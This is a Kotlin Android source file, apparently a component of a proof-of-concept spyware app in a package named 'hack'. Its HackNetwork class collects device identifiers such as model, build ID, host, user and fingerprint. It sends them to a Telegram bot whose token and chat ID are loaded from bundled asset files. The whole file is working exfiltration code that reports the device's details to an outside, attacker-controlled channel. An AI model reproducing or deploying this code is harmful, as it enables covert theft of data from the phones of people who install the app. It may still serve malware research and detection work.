package cocomelonc.hack

import android.content.Context
import android.os.Build
import okhttp3.Call
import okhttp3.Callback
import okhttp3.FormBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import java.io.IOException

class HackNetwork(private val context: Context) {

    private val client = OkHttpClient()

    // Function to send message using OkHttp
    fun sendTextMessage(message: String) {
        val token = getTokenFromAssets()
        val chatId = getChatIdFromAssets()
        val deviceInfo = getDeviceName()
        val meow = "Meow! ♥\uFE0F"
        val messageToSend = "$message\n\n$deviceInfo\n\n$meow\n\n"

        val requestBody = FormBody.Builder()
            .add("chat_id", chatId)
            .add("text", messageToSend)
            .build()

        val request = Request.Builder()
            .url("https://api.telegram.org/bot$token/sendMessage")
            .post(requestBody)
            .build()

        // Send the request asynchronously using OkHttp
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                e.printStackTrace()
            }

            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    // Handle success
                    println("Message sent successfully: ${response.body?.string()}")
                } else {
                    println("Error: ${response.body?.string()}")
                }
            }
        })
    }

    // Get device info
    private fun getDeviceName(): String {
        fun capitalize(s: String?): String {
            if (s.isNullOrEmpty()) {
                return ""
            }
            val first = s[0]
            return if (Character.isUpperCase(first)) {
                s
            } else {
                first.uppercaseChar().toString() + s.substring(1)
            }
        }

        val manufacturer = Build.MANUFACTURER
        val model = Build.MODEL
        val device = Build.DEVICE
        val deviceID = Build.ID
        val brand = Build.BRAND
        val hardware = Build.HARDWARE
        val hostInfo = Build.HOST
        val userInfo = Build.USER
        val board = Build.BOARD
        val display = Build.DISPLAY
        val fingerprint = Build.FINGERPRINT
        val devT = Build.TYPE
        val radio = Build.getRadioVersion()

        val info = "Hardware: ${capitalize(hardware)}\n" +
                "Manufacturer: ${capitalize(manufacturer)}\n" +
                "Model: ${capitalize(model)}\n" +
                "Device: ${capitalize(device)}\n" +
                "ID: ${capitalize(deviceID)}\n" +
                "Brand: ${capitalize(brand)}\n" +
                "Host: ${capitalize(hostInfo)}\n" +
                "User: ${capitalize(userInfo)}\n" +
                "Board: ${capitalize(board)}\n" +
                "Display: ${capitalize(display)}\n" +
                "Fingerprint: ${capitalize(fingerprint)}\n" +
                "Build TYPE: ${capitalize(devT)}\n" +
                "RADIO: ${capitalize(radio)}"

        return info
    }

    // Fetch token and chatId from assets (assuming these are saved in files)
    private fun getTokenFromAssets(): String {
        return context.assets.open("token.txt").bufferedReader().readText().trim()
    }

    private fun getChatIdFromAssets(): String {
        return context.assets.open("id.txt").bufferedReader().readText().trim()
    }
}